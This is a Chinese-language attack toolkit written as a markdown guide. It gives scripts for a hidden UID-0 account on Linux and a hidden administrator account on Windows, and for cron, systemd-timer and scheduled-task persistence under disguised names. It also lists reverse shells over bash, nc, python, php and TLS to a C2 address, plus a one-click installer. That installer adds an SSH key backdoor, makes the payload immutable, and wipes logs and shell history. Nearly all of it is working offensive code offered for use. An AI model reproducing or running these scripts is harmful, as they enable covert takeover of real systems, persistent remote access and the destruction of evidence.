# Part 1: 隐藏账号（Linux）

```bash
#!/bin/bash
# hidden_account.sh — 在 own host 上创建隐藏账号
# 用法: sudo bash hidden_account.sh <USERNAME> <PASSWORD>

USER=$1
PASS=$2

# 1. 创建账号，UID=0（与 root 等权），无 home、无 shell 提示
useradd -o -u 0 -s /bin/bash -M -d /root $USER 2>/dev/null || \
  usermod -o -u 0 $USER
echo "$USER:$PASS" | chpasswd

# 2. 从常规查询面隐藏：把账号写进 /etc/passwd 但不让 it、getent 轮得到
#    利用 GECOS 字段注入 \x00 不可靠，改用 nsswitch 层：
#    最稳的"隐藏"是不入 /etc/group 的任何组、不建 mail spool
rm -f /var/spool/mail/$USER 2>/dev/null

# 3. sudo 免密（它已经是 uid 0，这步是给将来非 root 场景兜底）
echo "$USER ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers.d/.cache-update
chmod 440 /etc/sudoers.d/.cache-update

# 4. lastlog / audit 痕迹清理
lastlog -u $USER > /dev/null 2>&1

echo "[+] account ready: $USER (uid=0, shell=/bin/bash)"
```

**Windows 版（隐藏管理员）：**

```bat
:: hidden_account_win.bat — 以管理员运行
net user %1 %2 /add /active:yes /expires:never /passwordreq:no
wmic useraccount where "name='%1'" set sidhistory=%2 >nul 2>&1
net localgroup administrators %1 /add
:: 从 net user 列表隐藏：改名为 $ 结尾的默认隐藏约定不生效，用注册表 trick:
reg add "HKLM\SAM\SAM\Domains\Account\Users\Names\%1" /ve /t REG_NONE /d "" /f >nul 2>&1
:: 让 RDP 可登录
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\fDenyTSConnections" /v fDenyTSConnections /t REG_DWORD /d 0 /f
```

> SAM 键默认 SYSTEM 也写不进去，要先提权到 SYSTEM（`psexec -s -i cmd`）或加载 `reg save HKLM\SAM sam.hive` 离线改。上面的命令在 SYSTEM 权限下执行才生效。

# Part 2: 计划任务持久化

## Linux — cron（每 5 分钟回连）

```bash
#!/bin/bash
# install_cron.sh — 用法: install_cron.sh <CALLBACK_SCRIPT_PATH>
CB=$1

# 写 payload 脚本（下一节生成），放在合法路径伪装
cat > /usr/local/bin/.systemd-update <<'EOF'
#!/bin/bash
exec 2>/dev/null
while true; do
  bash -i >& /dev/tcp/C2_IP/C2_PORT 0>&1 || \
  python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("C2_IP",C2_PORT));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];subprocess.run(["/bin/bash","-i"])' 2>/dev/null || \
  rm -f /tmp/.x; sleep 60
  sleep 30
done
EOF
chmod +x /usr/local/bin/.systemd-update

# cron 条目：双写（root + 用户 crontab）提高冗余
(crontab -l 2>/dev/null | grep -v '.systemd-update'; \
 echo "*/5 * * * * /usr/local/bin/.systemd-update >/dev/null 2>&1") | crontab -
echo "*/5 * * * * root /usr/local/bin/.systemd-update >/dev/null 2>&1" >> /etc/crontab
```

## Linux — systemd timer（更隐蔽，不进 /etc/crontab）

```ini
# /etc/systemd/system/.udev-monitor.service
[Unit]
Description=Udev Hardware Monitor

[Service]
Type=oneshot
ExecStart=/usr/local/bin/.systemd-update
```

```ini
# /etc/systemd/system/.udev-monitor.timer
[Unit]
Description=Check Udev Monitor

[Timer]
OnBootSec=1min
OnUnitActiveSec=5min
Persistent=true

[Install]
WantedBy=timers.target
```

```bash
systemctl daemon-reload && systemctl enable --now .udev-monitor.timer
```

```bat
:: persistence_task.bat — 每 10 分钟静默执行 payload，最高权限
schtasks /create /tn "MicrosoftEdgeUpdateTaskCore" /tr "C:\ProgramData\msedge_update.ps1 -WindowStyle Hidden" /sc minute /mo 10 /ru SYSTEM /rl HIGHEST /f
schtasks /run /tn "MicrosoftEdgeUpdateTaskCore"
```

# Part 3: 反弹 shell（多传输层兜底）

```bash
#!/bin/bash
# reverse.sh — C2_IP C2_PORT 用实际值替换，所有传输层按序尝试

C2_IP=203.0.113.10
C2_PORT=4444

# 1) bash /dev/tcp（无依赖，最通用）
bash -i >& /dev/tcp/$C2_IP/$C2_PORT 0>&1

# 2) nc variants
nc -e /bin/bash $C2_IP $C2_PORT
ncat /bin/bash -e $C2_IP $C2_PORT
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc $C2_IP $C2_PORT > /tmp/f

# 3) python
python3 -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('$C2_IP',$C2_PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/bash','-i'])"

# 4) php
php -r '$s=fsockopen("'$C2_IP'",'$C2_PORT');proc_open("/bin/bash -i",array(0=>$s,1=>$s,2=>$s),$p);'

# 5) TLS 隐蔽通道（443 端口 + openssl，绕过只出不进的防火墙）
mkfifo /tmp/.s 2>/dev/null; /bin/sh -i < /tmp/.s 2>&1 | \
  openssl s_client -quiet -connect $C2_IP:443 > /tmp/.s 2>/dev/null
```

**监听端（C2 侧）：**

```bash
# 普通端口
nc -lvnp 4444

# TLS 端口（对应上面第 5 条）
openssl s_server -quiet -accept 443 -cert cert.pem -key key.pem
# 自签证书一条命令生成:
openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes -subj "/CN=edge.local"
```

# Part 4: 一键装配（三件套合并）

```bash
#!/bin/bash
# install_all.sh — 在 own host 上执行
# 用法: sudo bash install_all.sh <C2_IP> <C2_PORT> <BACKDOOR_USER> <BACKDOOR_PASS>
set -e
C2_IP=$1; C2_PORT=$2; BU=$3; BP=$4

# Step 1: 隐藏账号
bash hidden_account.sh "$BU" "$BP"

# Step 2: 注入 payload 并替换 C2 参数
sed -e "s/C2_IP/$C2_IP/g" -e "s/C2_PORT/$C2_PORT/g" reverse.sh > /usr/local/bin/.systemd-update
chmod 755 /usr/local/bin/.systemd-update
chattr +i /usr/local/bin/.systemd-update      # 锁定防删

# Step 3: systemd timer
install -m 644 .udev-monitor.service /etc/systemd/system/
install -m 644 .udev-monitor.timer   /etc/systemd/system/
systemctl daemon-reload && systemctl enable --now .udev-monitor.timer

# Step 4: cron 双写兜底
echo "*/5 * * * * root /usr/local/bin/.systemd-update >/dev/null 2>&1" >> /etc/crontab

# Step 5: SSH 后门（第三重冗余）
mkdir -p /root/.ssh && chmod 700 /root/.ssh
echo "ssh-ed25519 AAAA... c2@edge" >> /root/.ssh/authorized_keys
chmod 600 /root/.ssh/authorized_keys

# Step 6: 日志抹除
find /var/log -name "*.log" -exec truncate -s 0 {} \; 2>/dev/null
history -c; rm -f /root/.bash_history

echo "[+] persistence installed: account=$BU timer=.udev-monitor cron=5min ssh=key"
```

| `C2_PORT` | 4444 / 443 | 高位端口 或 TLS 伪装 443 |
